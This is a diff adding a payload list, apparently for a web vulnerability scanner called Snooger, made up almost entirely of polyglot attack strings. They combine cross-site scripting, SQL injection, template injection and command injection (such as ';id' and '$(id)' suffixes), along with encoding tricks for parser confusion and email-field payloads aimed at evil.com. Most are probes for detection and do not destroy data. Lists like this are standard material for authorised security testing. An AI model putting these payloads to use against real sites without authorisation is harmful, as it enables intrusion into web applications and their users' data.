@@ -1,0 +1,70 @@
+# Snooger Polyglot Payloads — multi-context payloads that work across vulnerability classes
+# These trigger in multiple contexts: XSS + SQLi + SSTI + Command Injection simultaneously
+# ========================================================================================
+
+# === XSS + SQLi Polyglots ===
+'"><img src=x onerror=alert(1)>{{7*7}}
+"><svg/onload=alert(1)>'OR 1=1--
+'"><script>alert(1)</script>--
+" onclick=alert(1)//' OR '1'='1
+'"><img/src=x onerror=alert(1)>' AND '1'='1
+"><img src=x onerror=alert(1) ' OR ''='
+'"><svg onload=alert(1)//' UNION SELECT 1--
+"'><script>alert(1)</script>' UNION SELECT 1,2,3--
+
+# === XSS + SSTI Polyglots ===
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+<%= 7*7 %>{{7*7}}${7*7}
+{{7*7}}<script>alert(1)</script>
+#{7*7}<img src=x onerror=alert(1)>
+*{7*7}<svg onload=alert(1)>
+{{config}}<script>alert(1)</script>
+${7*7}{{7*7}}<%= 7*7 %>#{7*7}
+{{7*'7'}}<img src=x onerror=alert(1)>
+
+# === Universal Polyglots ===
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teleType/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm(1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
+" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+
+# === SQLi + SSTI Polyglots ===
+'{{7*7}}' UNION SELECT 1--
+"${7*7}" OR 1=1--
+'}}{{7*7}} OR '1'='1
+'{{config}}' AND '1'='1--
+1' AND '{{7*7}}'='49' --
+
+# === XSS + Command Injection Polyglots ===
+"><img src=x onerror=alert(1)>;id
+'<script>alert(1)</script>';id;#
+"><svg/onload=alert(1)>|id
+'><img src=x onerror=alert(1)>$(id)
+"><script>alert(1)</script>`id`
+'<script>alert(1)</script>'&&id
+
+# === Multi-Context Detection ===
+{{7*7}}${7*7}<%= 7*7 %>#{7*7}*{7*7}@{7*7}{7*7}${{7*7}}
+'"><img src=x onerror=alert(1)>{{7*7}}${7*7}&{7*7}
+'";|`$(id)`{{7*7}}<img src=x onerror=alert(1)>
+'\"-->]]>*/alert(1)/*--><script>alert(1)</script>{{7*7}}
+"><svg onload=alert(1)>'OR 1=1--{{7*7}}${7*7}
+
+# === Boundary / Parser Confusion ===
+%0a%0d%0a%0d<script>alert(1)</script>
+%00<script>alert(1)</script>
+\x00<script>alert(1)</script>
+%ef%bb%bf<script>alert(1)</script>
+%fe%ff<script>alert(1)</script>
+%ff%fe<script>alert(1)</script>
+
+# === JSON / XML Polyglots ===
+{"test":"'\"<script>alert(1)</script>{{7*7}}"}
+<root><![CDATA['"><script>alert(1)</script>{{7*7}}]]></root>
+
+# === Email Context Polyglots ===
+"'><script>alert(1)</script>"@evil.com
+'OR 1=1--"@evil.com
+{{7*7}}"@evil.com
+"><img src=x onerror=alert(1)>"@evil.com
